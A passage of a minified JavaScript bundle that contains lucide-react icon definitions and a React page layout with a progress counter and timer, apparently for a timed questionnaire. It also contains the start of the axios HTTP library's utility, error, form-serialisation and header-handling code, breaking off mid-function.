 */const ks=Ve("AlertCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["line",{x1:"12",x2:"12",y1:"8",y2:"12",key:"1pkeuh"}],["line",{x1:"12",x2:"12.01",y1:"16",y2:"16",key:"4dfq90"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const oL=Ve("Bold",[["path",{d:"M14 12a4 4 0 0 0 0-8H6v8",key:"v2sylx"}],["path",{d:"M15 20a4 4 0 0 0 0-8H6v8Z",key:"1ef5ya"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const ig=Ve("Camera",[["path",{d:"M14.5 4h-5L7 7H4a2 2 0 0 0-2 2v9a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-3l-2.5-3z",key:"1tc9qg"}],["circle",{cx:"12",cy:"13",r:"3",key:"1vg3eu"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const aa=Ve("CheckCircle",[["path",{d:"M22 11.08V12a10 10 0 1 1-5.93-9.14",key:"g774vq"}],["path",{d:"m9 11 3 3L22 4",key:"1pflzl"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Cb=Ve("Clock",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["polyline",{points:"12 6 12 12 16 14",key:"68esgv"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const aL=Ve("Copy",[["rect",{width:"14",height:"14",x:"8",y:"8",rx:"2",ry:"2",key:"17jyea"}],["path",{d:"M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",key:"zix9uf"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const lL=Ve("EyeOff",[["path",{d:"M9.88 9.88a3 3 0 1 0 4.24 4.24",key:"1jxqfv"}],["path",{d:"M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68",key:"9wicm4"}],["path",{d:"M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61",key:"1jreej"}],["line",{x1:"2",x2:"22",y1:"2",y2:"22",key:"a6p6uj"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const uL=Ve("Eye",[["path",{d:"M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z",key:"rwhkz3"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const cL=Ve("Italic",[["line",{x1:"19",x2:"10",y1:"4",y2:"4",key:"15jd3p"}],["line",{x1:"14",x2:"5",y1:"20",y2:"20",key:"bu0au3"}],["line",{x1:"15",x2:"9",y1:"4",y2:"20",key:"uljnxc"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const dL=Ve("ListOrdered",[["line",{x1:"10",x2:"21",y1:"6",y2:"6",key:"76qw6h"}],["line",{x1:"10",x2:"21",y1:"12",y2:"12",key:"16nom4"}],["line",{x1:"10",x2:"21",y1:"18",y2:"18",key:"u3jurt"}],["path",{d:"M4 6h1v4",key:"cnovpq"}],["path",{d:"M4 10h2",key:"16xx2s"}],["path",{d:"M6 18H4c0-1 2-2 2-3s-1-1.5-2-1",key:"m9a95d"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const fL=Ve("List",[["line",{x1:"8",x2:"21",y1:"6",y2:"6",key:"7ey8pc"}],["line",{x1:"8",x2:"21",y1:"12",y2:"12",key:"rjfblc"}],["line",{x1:"8",x2:"21",y1:"18",y2:"18",key:"c3b1m8"}],["line",{x1:"3",x2:"3.01",y1:"6",y2:"6",key:"1g7gq3"}],["line",{x1:"3",x2:"3.01",y1:"12",y2:"12",key:"1pjlvk"}],["line",{x1:"3",x2:"3.01",y1:"18",y2:"18",key:"28t2mc"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Nx=Ve("Pause",[["rect",{width:"4",height:"16",x:"6",y:"4",key:"iffhe4"}],["rect",{width:"4",height:"16",x:"14",y:"4",key:"sjin7j"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Ax=Ve("Play",[["polygon",{points:"5 3 19 12 5 21 5 3",key:"191637"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const hL=Ve("Quote",[["path",{d:"M3 21c3 0 7-1 7-8V5c0-1.25-.756-2.017-2-2H4c-1.25 0-2 .75-2 1.972V11c0 1.25.75 2 2 2 1 0 1 0 1 1v1c0 1-1 2-2 2s-1 .008-1 1.031V20c0 1 0 1 1 1z",key:"4rm80e"}],["path",{d:"M15 21c3 0 7-1 7-8V5c0-1.25-.757-2.017-2-2h-4c-1.25 0-2 .75-2 1.972V11c0 1.25.75 2 2 2h.75c0 2.25.25 4-2.75 4v3c0 1 0 1 1 1z",key:"10za9r"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const Px=Ve("Square",[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",key:"afitv7"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const pL=Ve("Star",[["polygon",{points:"12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2",key:"8f66p6"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const mL=Ve("User",[["path",{d:"M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2",key:"975kel"}],["circle",{cx:"12",cy:"7",r:"4",key:"17ys0d"}]]);/**
 * @license lucide-react v0.344.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */const gL=Ve("X",[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]]),Cr=({children:t,showProgress:e=!1,currentStep:n=0,totalSteps:r=3,timeRemaining:i,userName:s,company:o})=>m.jsxs(I.div,{className:"min-h-screen bg-gray-900",initial:{opacity:0},animate:{opacity:1},transition:{duration:.5},children:[m.jsx(I.header,{className:"bg-gray-800 border-b border-gray-700",initial:{y:-50,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:.1},children:m.jsx("div",{className:"max-w-7xl mx-auto px-4 sm:px-6 lg:px-8",children:m.jsxs("div",{className:"flex justify-between items-center h-16",children:[m.jsx("div",{className:"flex items-center",children:o&&m.jsx("a",{className:"text-xl font-bold text-white underline",href:o.url,children:o.name})}),m.jsxs("div",{className:"flex items-center space-x-6",children:[e&&m.jsxs(m.Fragment,{children:[m.jsxs("div",{className:"text-sm text-gray-300",children:["Answered: ",m.jsxs("span",{className:"font-semibold",children:[n," / ",r]})]}),i&&m.jsxs("div",{className:"flex items-center text-sm text-gray-300",children:[m.jsx(Cb,{className:"w-4 h-4 mr-1"}),i]})]}),s&&m.jsxs("div",{className:"flex items-center text-sm text-gray-300",children:[m.jsx(mL,{className:"w-4 h-4 mr-2"}),s]})]})]})})}),m.jsx(I.main,{className:"max-w-7xl mx-auto py-8 px-4 sm:px-6 lg:px-8",initial:{y:20,opacity:0},animate:{y:0,opacity:1},transition:{duration:.6,delay:.2},children:t})]});function Eb(t,e){return function(){return t.apply(e,arguments)}}const{toString:yL}=Object.prototype,{getPrototypeOf:sg}=Object,{iterator:Fc,toStringTag:Tb}=Symbol,Bc=(t=>e=>{const n=yL.call(e);return t[n]||(t[n]=n.slice(8,-1).toLowerCase())})(Object.create(null)),ln=t=>(t=t.toLowerCase(),e=>Bc(e)===t),Vc=t=>e=>typeof e===t,{isArray:Vs}=Array,la=Vc("undefined");function Da(t){return t!==null&&!la(t)&&t.constructor!==null&&!la(t.constructor)&&wt(t.constructor.isBuffer)&&t.constructor.isBuffer(t)}const Mb=ln("ArrayBuffer");function xL(t){let e;return typeof ArrayBuffer<"u"&&ArrayBuffer.isView?e=ArrayBuffer.isView(t):e=t&&t.buffer&&Mb(t.buffer),e}const vL=Vc("string"),wt=Vc("function"),Nb=Vc("number"),La=t=>t!==null&&typeof t=="object",wL=t=>t===!0||t===!1,zl=t=>{if(Bc(t)!=="object")return!1;const e=sg(t);return(e===null||e===Object.prototype||Object.getPrototypeOf(e)===null)&&!(Tb in t)&&!(Fc in t)},SL=t=>{if(!La(t)||Da(t))return!1;try{return Object.keys(t).length===0&&Object.getPrototypeOf(t)===Object.prototype}catch{return!1}},kL=ln("Date"),bL=ln("File"),CL=ln("Blob"),EL=ln("FileList"),TL=t=>La(t)&&wt(t.pipe),ML=t=>{let e;return t&&(typeof FormData=="function"&&t instanceof FormData||wt(t.append)&&((e=Bc(t))==="formdata"||e==="object"&&wt(t.toString)&&t.toString()==="[object FormData]"))},NL=ln("URLSearchParams"),[AL,PL,RL,OL]=["ReadableStream","Request","Response","Headers"].map(ln),DL=t=>t.trim?t.trim():t.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,"");function Ia(t,e,{allOwnKeys:n=!1}={}){if(t===null||typeof t>"u")return;let r,i;if(typeof t!="object"&&(t=[t]),Vs(t))for(r=0,i=t.length;r<i;r++)e.call(null,t[r],r,t);else{if(Da(t))return;const s=n?Object.getOwnPropertyNames(t):Object.keys(t),o=s.length;let a;for(r=0;r<o;r++)a=s[r],e.call(null,t[a],a,t)}}function Ab(t,e){if(Da(t))return null;e=e.toLowerCase();const n=Object.keys(t);let r=n.length,i;for(;r-- >0;)if(i=n[r],e===i.toLowerCase())return i;return null}const Zr=typeof globalThis<"u"?globalThis:typeof self<"u"?self:typeof window<"u"?window:global,Pb=t=>!la(t)&&t!==Zr;function $h(){const{caseless:t}=Pb(this)&&this||{},e={},n=(r,i)=>{const s=t&&Ab(e,i)||i;zl(e[s])&&zl(r)?e[s]=$h(e[s],r):zl(r)?e[s]=$h({},r):Vs(r)?e[s]=r.slice():e[s]=r};for(let r=0,i=arguments.length;r<i;r++)arguments[r]&&Ia(arguments[r],n);return e}const LL=(t,e,n,{allOwnKeys:r}={})=>(Ia(e,(i,s)=>{n&&wt(i)?t[s]=Eb(i,n):t[s]=i},{allOwnKeys:r}),t),IL=t=>(t.charCodeAt(0)===65279&&(t=t.slice(1)),t),jL=(t,e,n,r)=>{t.prototype=Object.create(e.prototype,r),t.prototype.constructor=t,Object.defineProperty(t,"super",{value:e.prototype}),n&&Object.assign(t.prototype,n)},FL=(t,e,n,r)=>{let i,s,o;const a={};if(e=e||{},t==null)return e;do{for(i=Object.getOwnPropertyNames(t),s=i.length;s-- >0;)o=i[s],(!r||r(o,t,e))&&!a[o]&&(e[o]=t[o],a[o]=!0);t=n!==!1&&sg(t)}while(t&&(!n||n(t,e))&&t!==Object.prototype);return e},BL=(t,e,n)=>{t=String(t),(n===void 0||n>t.length)&&(n=t.length),n-=e.length;const r=t.indexOf(e,n);return r!==-1&&r===n},VL=t=>{if(!t)return null;if(Vs(t))return t;let e=t.length;if(!Nb(e))return null;const n=new Array(e);for(;e-- >0;)n[e]=t[e];return n},zL=(t=>e=>t&&e instanceof t)(typeof Uint8Array<"u"&&sg(Uint8Array)),_L=(t,e)=>{const r=(t&&t[Fc]).call(t);let i;for(;(i=r.next())&&!i.done;){const s=i.value;e.call(t,s[0],s[1])}},$L=(t,e)=>{let n;const r=[];for(;(n=t.exec(e))!==null;)r.push(n);return r},HL=ln("HTMLFormElement"),UL=t=>t.toLowerCase().replace(/[-_\s]([a-z\d])(\w*)/g,function(n,r,i){return r.toUpperCase()+i}),Rx=(({hasOwnProperty:t})=>(e,n)=>t.call(e,n))(Object.prototype),WL=ln("RegExp"),Rb=(t,e)=>{const n=Object.getOwnPropertyDescriptors(t),r={};Ia(n,(i,s)=>{let o;(o=e(i,s,t))!==!1&&(r[s]=o||i)}),Object.defineProperties(t,r)},KL=t=>{Rb(t,(e,n)=>{if(wt(t)&&["arguments","caller","callee"].indexOf(n)!==-1)return!1;const r=t[n];if(wt(r)){if(e.enumerable=!1,"writable"in e){e.writable=!1;return}e.set||(e.set=()=>{throw Error("Can not rewrite read-only method '"+n+"'")})}})},qL=(t,e)=>{const n={},r=i=>{i.forEach(s=>{n[s]=!0})};return Vs(t)?r(t):r(String(t).split(e)),n},GL=()=>{},JL=(t,e)=>t!=null&&Number.isFinite(t=+t)?t:e;function YL(t){return!!(t&&wt(t.append)&&t[Tb]==="FormData"&&t[Fc])}const QL=t=>{const e=new Array(10),n=(r,i)=>{if(La(r)){if(e.indexOf(r)>=0)return;if(Da(r))return r;if(!("toJSON"in r)){e[i]=r;const s=Vs(r)?[]:{};return Ia(r,(o,a)=>{const l=n(o,i+1);!la(l)&&(s[a]=l)}),e[i]=void 0,s}}return r};return n(t,0)},XL=ln("AsyncFunction"),ZL=t=>t&&(La(t)||wt(t))&&wt(t.then)&&wt(t.catch),Ob=((t,e)=>t?setImmediate:e?((n,r)=>(Zr.addEventListener("message",({source:i,data:s})=>{i===Zr&&s===n&&r.length&&r.shift()()},!1),i=>{r.push(i),Zr.postMessage(n,"*")}))(`axios@${Math.random()}`,[]):n=>setTimeout(n))(typeof setImmediate=="function",wt(Zr.postMessage)),eI=typeof queueMicrotask<"u"?queueMicrotask.bind(Zr):typeof process<"u"&&process.nextTick||Ob,tI=t=>t!=null&&wt(t[Fc]),T={isArray:Vs,isArrayBuffer:Mb,isBuffer:Da,isFormData:ML,isArrayBufferView:xL,isString:vL,isNumber:Nb,isBoolean:wL,isObject:La,isPlainObject:zl,isEmptyObject:SL,isReadableStream:AL,isRequest:PL,isResponse:RL,isHeaders:OL,isUndefined:la,isDate:kL,isFile:bL,isBlob:CL,isRegExp:WL,isFunction:wt,isStream:TL,isURLSearchParams:NL,isTypedArray:zL,isFileList:EL,forEach:Ia,merge:$h,extend:LL,trim:DL,stripBOM:IL,inherits:jL,toFlatObject:FL,kindOf:Bc,kindOfTest:ln,endsWith:BL,toArray:VL,forEachEntry:_L,matchAll:$L,isHTMLForm:HL,hasOwnProperty:Rx,hasOwnProp:Rx,reduceDescriptors:Rb,freezeMethods:KL,toObjectSet:qL,toCamelCase:UL,noop:GL,toFiniteNumber:JL,findKey:Ab,global:Zr,isContextDefined:Pb,isSpecCompliantForm:YL,toJSONObject:QL,isAsyncFn:XL,isThenable:ZL,setImmediate:Ob,asap:eI,isIterable:tI};function U(t,e,n,r,i){Error.call(this),Error.captureStackTrace?Error.captureStackTrace(this,this.constructor):this.stack=new Error().stack,this.message=t,this.name="AxiosError",e&&(this.code=e),n&&(this.config=n),r&&(this.request=r),i&&(this.response=i,this.status=i.status?i.status:null)}T.inherits(U,Error,{toJSON:function(){return{message:this.message,name:this.name,description:this.description,number:this.number,fileName:this.fileName,lineNumber:this.lineNumber,columnNumber:this.columnNumber,stack:this.stack,config:T.toJSONObject(this.config),code:this.code,status:this.status}}});const Db=U.prototype,Lb={};["ERR_BAD_OPTION_VALUE","ERR_BAD_OPTION","ECONNABORTED","ETIMEDOUT","ERR_NETWORK","ERR_FR_TOO_MANY_REDIRECTS","ERR_DEPRECATED","ERR_BAD_RESPONSE","ERR_BAD_REQUEST","ERR_CANCELED","ERR_NOT_SUPPORT","ERR_INVALID_URL"].forEach(t=>{Lb[t]={value:t}});Object.defineProperties(U,Lb);Object.defineProperty(Db,"isAxiosError",{value:!0});U.from=(t,e,n,r,i,s)=>{const o=Object.create(Db);return T.toFlatObject(t,o,function(l){return l!==Error.prototype},a=>a!=="isAxiosError"),U.call(o,t.message,e,n,r,i),o.cause=t,o.name=t.name,s&&Object.assign(o,s),o};const nI=null;function Hh(t){return T.isPlainObject(t)||T.isArray(t)}function Ib(t){return T.endsWith(t,"[]")?t.slice(0,-2):t}function Ox(t,e,n){return t?t.concat(e).map(function(i,s){return i=Ib(i),!n&&s?"["+i+"]":i}).join(n?".":""):e}function rI(t){return T.isArray(t)&&!t.some(Hh)}const iI=T.toFlatObject(T,{},null,function(e){return/^is[A-Z]/.test(e)});function zc(t,e,n){if(!T.isObject(t))throw new TypeError("target must be an object");e=e||new FormData,n=T.toFlatObject(n,{metaTokens:!0,dots:!1,indexes:!1},!1,function(y,x){return!T.isUndefined(x[y])});const r=n.metaTokens,i=n.visitor||c,s=n.dots,o=n.indexes,l=(n.Blob||typeof Blob<"u"&&Blob)&&T.isSpecCompliantForm(e);if(!T.isFunction(i))throw new TypeError("visitor must be a function");function u(p){if(p===null)return"";if(T.isDate(p))return p.toISOString();if(T.isBoolean(p))return p.toString();if(!l&&T.isBlob(p))throw new U("Blob is not supported. Use a Buffer instead.");return T.isArrayBuffer(p)||T.isTypedArray(p)?l&&typeof Blob=="function"?new Blob([p]):Buffer.from(p):p}function c(p,y,x){let g=p;if(p&&!x&&typeof p=="object"){if(T.endsWith(y,"{}"))y=r?y:y.slice(0,-2),p=JSON.stringify(p);else if(T.isArray(p)&&rI(p)||(T.isFileList(p)||T.endsWith(y,"[]"))&&(g=T.toArray(p)))return y=Ib(y),g.forEach(function(w,b){!(T.isUndefined(w)||w===null)&&e.append(o===!0?Ox([y],b,s):o===null?y:y+"[]",u(w))}),!1}return Hh(p)?!0:(e.append(Ox(x,y,s),u(p)),!1)}const d=[],f=Object.assign(iI,{defaultVisitor:c,convertValue:u,isVisitable:Hh});function h(p,y){if(!T.isUndefined(p)){if(d.indexOf(p)!==-1)throw Error("Circular reference detected in "+y.join("."));d.push(p),T.forEach(p,function(g,v){(!(T.isUndefined(g)||g===null)&&i.call(e,g,T.isString(v)?v.trim():v,y,f))===!0&&h(g,y?y.concat(v):[v])}),d.pop()}}if(!T.isObject(t))throw new TypeError("data must be an object");return h(t),e}function Dx(t){const e={"!":"%21","'":"%27","(":"%28",")":"%29","~":"%7E","%20":"+","%00":"\0"};return encodeURIComponent(t).replace(/[!'()~]|%20|%00/g,function(r){return e[r]})}function og(t,e){this._pairs=[],t&&zc(t,this,e)}const jb=og.prototype;jb.append=function(e,n){this._pairs.push([e,n])};jb.toString=function(e){const n=e?function(r){return e.call(this,r,Dx)}:Dx;return this._pairs.map(function(i){return n(i[0])+"="+n(i[1])},"").join("&")};function sI(t){return encodeURIComponent(t).replace(/%3A/gi,":").replace(/%24/g,"$").replace(/%2C/gi,",").replace(/%20/g,"+").replace(/%5B/gi,"[").replace(/%5D/gi,"]")}function Fb(t,e,n){if(!e)return t;const r=n&&n.encode||sI;T.isFunction(n)&&(n={serialize:n});const i=n&&n.serialize;let s;if(i?s=i(e,n):s=T.isURLSearchParams(e)?e.toString():new og(e,n).toString(r),s){const o=t.indexOf("#");o!==-1&&(t=t.slice(0,o)),t+=(t.indexOf("?")===-1?"?":"&")+s}return t}class Lx{constructor(){this.handlers=[]}use(e,n,r){return this.handlers.push({fulfilled:e,rejected:n,synchronous:r?r.synchronous:!1,runWhen:r?r.runWhen:null}),this.handlers.length-1}eject(e){this.handlers[e]&&(this.handlers[e]=null)}clear(){this.handlers&&(this.handlers=[])}forEach(e){T.forEach(this.handlers,function(r){r!==null&&e(r)})}}const Bb={silentJSONParsing:!0,forcedJSONParsing:!0,clarifyTimeoutError:!1},oI=typeof URLSearchParams<"u"?URLSearchParams:og,aI=typeof FormData<"u"?FormData:null,lI=typeof Blob<"u"?Blob:null,uI={isBrowser:!0,classes:{URLSearchParams:oI,FormData:aI,Blob:lI},protocols:["http","https","file","blob","url","data"]},ag=typeof window<"u"&&typeof document<"u",Uh=typeof navigator=="object"&&navigator||void 0,cI=ag&&(!Uh||["ReactNative","NativeScript","NS"].indexOf(Uh.product)<0),dI=typeof WorkerGlobalScope<"u"&&self instanceof WorkerGlobalScope&&typeof self.importScripts=="function",fI=ag&&window.location.href||"http://localhost",hI=Object.freeze(Object.defineProperty({__proto__:null,hasBrowserEnv:ag,hasStandardBrowserEnv:cI,hasStandardBrowserWebWorkerEnv:dI,navigator:Uh,origin:fI},Symbol.toStringTag,{value:"Module"})),Ze={...hI,...uI};function pI(t,e){return zc(t,new Ze.classes.URLSearchParams,{visitor:function(n,r,i,s){return Ze.isNode&&T.isBuffer(n)?(this.append(r,n.toString("base64")),!1):s.defaultVisitor.apply(this,arguments)},...e})}function mI(t){return T.matchAll(/\w+|\[(\w*)]/g,t).map(e=>e[0]==="[]"?"":e[1]||e[0])}function gI(t){const e={},n=Object.keys(t);let r;const i=n.length;let s;for(r=0;r<i;r++)s=n[r],e[s]=t[s];return e}function Vb(t){function e(n,r,i,s){let o=n[s++];if(o==="__proto__")return!0;const a=Number.isFinite(+o),l=s>=n.length;return o=!o&&T.isArray(i)?i.length:o,l?(T.hasOwnProp(i,o)?i[o]=[i[o],r]:i[o]=r,!a):((!i[o]||!T.isObject(i[o]))&&(i[o]=[]),e(n,r,i[o],s)&&T.isArray(i[o])&&(i[o]=gI(i[o])),!a)}if(T.isFormData(t)&&T.isFunction(t.entries)){const n={};return T.forEachEntry(t,(r,i)=>{e(mI(r),i,n,0)}),n}return null}function yI(t,e,n){if(T.isString(t))try{return(e||JSON.parse)(t),T.trim(t)}catch(r){if(r.name!=="SyntaxError")throw r}return(0,JSON.stringify)(t)}const ja={transitional:Bb,adapter:["xhr","http","fetch"],transformRequest:[function(e,n){const r=n.getContentType()||"",i=r.indexOf("application/json")>-1,s=T.isObject(e);if(s&&T.isHTMLForm(e)&&(e=new FormData(e)),T.isFormData(e))return i?JSON.stringify(Vb(e)):e;if(T.isArrayBuffer(e)||T.isBuffer(e)||T.isStream(e)||T.isFile(e)||T.isBlob(e)||T.isReadableStream(e))return e;if(T.isArrayBufferView(e))return e.buffer;if(T.isURLSearchParams(e))return n.setContentType("application/x-www-form-urlencoded;charset=utf-8",!1),e.toString();let a;if(s){if(r.indexOf("application/x-www-form-urlencoded")>-1)return pI(e,this.formSerializer).toString();if((a=T.isFileList(e))||r.indexOf("multipart/form-data")>-1){const l=this.env&&this.env.FormData;return zc(a?{"files[]":e}:e,l&&new l,this.formSerializer)}}return s||i?(n.setContentType("application/json",!1),yI(e)):e}],transformResponse:[function(e){const n=this.transitional||ja.transitional,r=n&&n.forcedJSONParsing,i=this.responseType==="json";if(T.isResponse(e)||T.isReadableStream(e))return e;if(e&&T.isString(e)&&(r&&!this.responseType||i)){const o=!(n&&n.silentJSONParsing)&&i;try{return JSON.parse(e)}catch(a){if(o)throw a.name==="SyntaxError"?U.from(a,U.ERR_BAD_RESPONSE,this,null,this.response):a}}return e}],timeout:0,xsrfCookieName:"XSRF-TOKEN",xsrfHeaderName:"X-XSRF-TOKEN",maxContentLength:-1,maxBodyLength:-1,env:{FormData:Ze.classes.FormData,Blob:Ze.classes.Blob},validateStatus:function(e){return e>=200&&e<300},headers:{common:{Accept:"application/json, text/plain, */*","Content-Type":void 0}}};T.forEach(["delete","get","head","post","put","patch"],t=>{ja.headers[t]={}});const xI=T.toObjectSet(["age","authorization","content-length","content-type","etag","expires","from","host","if-modified-since","if-unmodified-since","last-modified","location","max-forwards","proxy-authorization","referer","retry-after","user-agent"]),vI=t=>{const e={};let n,r,i;return t&&t.split(`
`).forEach(function(o){i=o.indexOf(":"),n=o.substring(0,i).trim().toLowerCase(),r=o.substring(i+1).trim(),!(!n||e[n]&&xI[n])&&(n==="set-cookie"?e[n]?e[n].push(r):e[n]=[r]:e[n]=e[n]?e[n]+", "+r:r)}),e},Ix=Symbol("internals");function eo(t){return t&&String(t).trim().toLowerCase()}function _l(t){return t===!1||t==null?t:T.isArray(t)?t.map(_l):String(t)}function wI(t){const e=Object.create(null),n=/([^\s,;=]+)\s*(?:=\s*([^,;]+))?/g;let r;for(;r=n.exec(t);)e[r[1]]=r[2];return e}const SI=t=>/^[-_a-zA-Z0-9^`|~,!#$%&'*+.]+$/.test(t.trim());function Jd(t,e,n,r,i){if(T.isFunction(r))return r.call(this,e,n);if(i&&(e=n),!!T.isString(e)){if(T.isString(r))return e.indexOf(r)!==-1;if(T.isRegExp(r))return r.test(e)}}function kI(t){return t.trim().toLowerCase().replace(/([a-z\d])(\w*)/g,(e,n,r)=>n.toUpperCase()+r)}function bI(t,e){const n=T.toCamelCase(" "+e);["get","set","has"].forEach(r=>{Object.defineProperty(t,r+n,{value:function(i,s,o){return this[r].call(this,e,i,s,o)},configurable:!0})})}class St{constructor(e){e&&this.set(e)}set(e,n,r){const i=this;function s(a,l,u){const c=eo(l);if(!c)throw new Error("header name must be a non-empty string");const d=T.findKey(i,c);(!d||i[d]===void 0||u===!0||u===void 0&&i[d]!==!1)&&(i[d||l]=_l(a))}const o=(a,l)=>T.forEach(a,(u,c)=>s(u,c,l));if(T.isPlainObject(e)||e instanceof this.constructor)o(e,n);else if(T.isString(e)&&(e=e.trim())&&!SI(e))o(vI(e),n);else if(T.isObject(e)&&T.isIterable(e)){let a={},l,u;for(const c of e){if(!T.isArray(c))throw TypeError("Object iterator must return a key-value pair");a[u=c[0]]=(l=a[u])?T.isArray(l)?[...l,c[1]]:[l,c[1]]:c[1]}o(a,n)}else e!=null&&s(n,e,r);return this}get(e,n){if(e=eo(e),e){const r=T.findKey(this,e);if(r){const i=this[r];if(!n)return i;if(n===!0)return wI(i);if(T.isFunction(n))return n.call(this,i,r);if(T.isRegExp(n))return n.exec(i);throw new TypeError("parser must be boolean|regexp|function")}}}has(e,n){if(e=eo(e),e){const r=T.findKey(this,e);return!!(r&&this[r]!==void 0&&(!n||Jd(this,this[r],r,n)))}return!1}delete(e,n){const r=this;let i=!1;function s(o){if(o=eo(o),o){const a=T.findKey(r,o);a&&(!n||Jd(r,r[a],a,n))&&(delete r[a],i=!0)}}return T.isArray(e)?e.forEach(s):s(e),i}clear(e){const n=Object.keys(this);let r=n.length,i=!1;for(;r--;){const s=n[r];(!e||Jd(this,this[s],s,e,!0))&&(delete this[s],i=!0)}return i}normalize(e){const n=this,r={};return T.forEach(this,(i,s)=>{const o=T.findKey(r,s);if(o){n[o]=_l(i),delete n[s];return}const a=e?kI(s):String(s).trim();a!==s&&delete n[s],n[a]=_l(i),r[a]=!0}),this}concat(...e){return this.constructor.concat(this,...e)}toJSON(e){const n=Object.create(null);return T.forEach(this,(r,i)=>{r!=null&&r!==!1&&(n[i]=e&&T.isArray(r)?r.join(", "):r)}),n}[Symbol.iterator](){return Object.entries(this.toJSON())[Symbol.iterator]()}toString(){return Object.entries(this.toJSON()).map(([e,n])=>e+": "+n).join(`
`)}getSetCookie(){return this.get("set-cookie")||[]}get[Symbol.toStringTag](){return"AxiosHeaders"}static from(e){return e instanceof this?e:new this(e)}static concat(e,...n){const r=new this(e);return n.forEach(i=>r.set(i)),r}static accessor(e){const r=(this[Ix]=this[Ix]={accessors:{}}).accessors,i=this.prototype;function s(o){const a=eo(o);r[a]||(bI(i,o),r[a]=!0)}return T.isArray(e)?e.forEach(s):s(e),this}}St.accessor(["Content-Type","Content-Length","Accept","Accept-Encoding","User-Agent","Authorization"]);T.reduceDescriptors(St.prototype,({value:t},e)=>{let n=e[0].toUpperCase()+e.slice(1);return{get:()=>t,set(r){this[n]=r}}});T.freezeMethods(St);function Yd(t,e){const n=this||ja,r=e||n,i=St.from(r.headers);let s=r.data;return T.forEach(t,function(a){s=a.call(n,s,i.normalize(),e?e.status:void 0)}),i.normalize(),s}function zb(t){return!!(t&&t.__CANCEL__)}function zs(t,e,n){U.call(this,t??"canceled",U.ERR_CANCELED,e,n),this.name="CanceledError"}T.inherits(zs,U,{__CANCEL__:!0});function _b(t,e,n){const r=n.config.validateStatus;!n.status||!r||r(n.status)?t(n):e(new U("Request failed with status code "+n.status,[U.ERR_BAD_REQUEST,U.ERR_BAD_RESPONSE][Math.floor(n.status/100)-4],n.config,n.request,n))}function CI(t){const e=/^([-+\w]{1,25})(:?\/\/|:)/.exec(t);return e&&e[1]||""}function EI(t,e){t=t||10;const n=new Array(t),r=new Array(t);let i=0,s=0,o;return e=e!==void 0?e:1e3,function(l){const u=Date.now(),c=r[s];o||(o=u),n[i]=l,r[i]=u;let d=s,f=0;for(;d!==i;)f+=n[d++],d=d%t;if(i=(i+1)%t,i===s&&(s=(s+1)%t),u-o<e)return;const h=c&&u-c;return h?Math.round(f*1e3/h):void 0}}function TI(t,e){let n=0,r=1e3/e,i,s;const o=(u,c=Date.now())=>{n=c,i=null,s&&(clearTimeout(s),s=null),t(...u)};return[(...u)=>{const c=Date.now(),d=c-n;d>=r?o(u,c):(i=u,s||(s=setTimeout(()=>{s=null,o(i)},r-d)))},()=>i&&o(i)]}const Eu=(t,e,n=3)=>{let r=0;const i=EI(50,250);return TI(s=>{const o=s.loaded,a=s.lengthComputable?s.total:void 